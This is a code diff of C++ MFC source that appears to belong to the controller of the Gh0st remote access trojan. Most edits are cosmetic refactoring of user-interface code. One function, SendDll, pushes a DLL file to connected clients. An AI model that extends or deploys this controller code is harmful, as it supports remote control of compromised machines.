@@ -199,10 +199,9 @@ CSize CMainFrame::LoadMyBitmap(UINT nID)
 	CSize m_Size = pDC->GetTextExtent("刷新");
 	ReleaseDC(pDC);
 	CRect rect(0, 0, 60, 32);
-	CBitmap *pBitmap, *pOldBitmap;
-	pBitmap = new CBitmap;
+	CBitmap *pBitmap = new CBitmap;
 	pBitmap->LoadBitmap(nID);
-	pOldBitmap = m_MemDC.SelectObject(pBitmap);
+	CBitmap *pOldBitmap = m_MemDC.SelectObject(pBitmap);
 	TransParentDC(rect, &m_MemDC);
 	m_MemDC.SelectObject(pOldBitmap);
 	img.Add(pBitmap, GetSysColor(COLOR_MENU));
@@ -341,8 +340,6 @@ void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UI
 {
 	try
 	{
-		CMainFrame* pFrame = (CMainFrame*)lpParam;
-
 		// 对g_pConnectView 进行初始化
 		g_pConnectView = (Cgh0stView *)((Cgh0stApp *)AfxGetApp())->m_pConnectView;
 
@@ -370,6 +367,8 @@ void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UI
 			break;
 		case NC_RECEIVE_COMPLETE:
 			ProcessReceiveComplete(pContext);
+			break;
+		default: 
 			break;
 		}
 	}
@@ -555,14 +554,13 @@ typedef struct _MsgHead
 	DWORD lp;
 }Msghead, *LPMsghead;
 
-const WCHAR LoadDll[] = _T("LoadDll.dll");
+const TCHAR LoadDll[] = _T("LoadDll.dll");
 
 void SendDll(ClientContext *pContext)
 {
 	Msghead msg;
-	HANDLE hFile;
 
-	hFile = CreateFile(LoadDll, GENERIC_ALL, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	HANDLE hFile = CreateFile(LoadDll, GENERIC_ALL, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
@@ -585,7 +583,7 @@ void SendDll(ClientContext *pContext)
 	VirtualFree(lpbuf, dwSize);
 
 	return;
-	
+
 }
 
 const int AuthId = 93226;
@@ -663,7 +661,6 @@ void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
 
 void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
 {
-	// TODO: Add your message handler code here and/or call default
 	pCmdUI->Enable();
 }
 
@@ -697,10 +694,7 @@ void CMainFrame::ShowToolTips(LPCTSTR lpszText)
 
 void CMainFrame::OnTimer(UINT nIDEvent)
 {
-	// TODO: Add your message handler code here and/or call default
-
-	CTime time;
-	time = CTime::GetCurrentTime();	//得到当前时间
+	CTime time = CTime::GetCurrentTime();	//得到当前时间
 
 	CString s = time.Format(_T("%H:%M:%S"));		//转换时间格式
 	m_wndStatusBar.SetPaneText(m_wndStatusBar.CommandToIndex(ID_INDICATOR_CLOCK), s);	//显示时钟
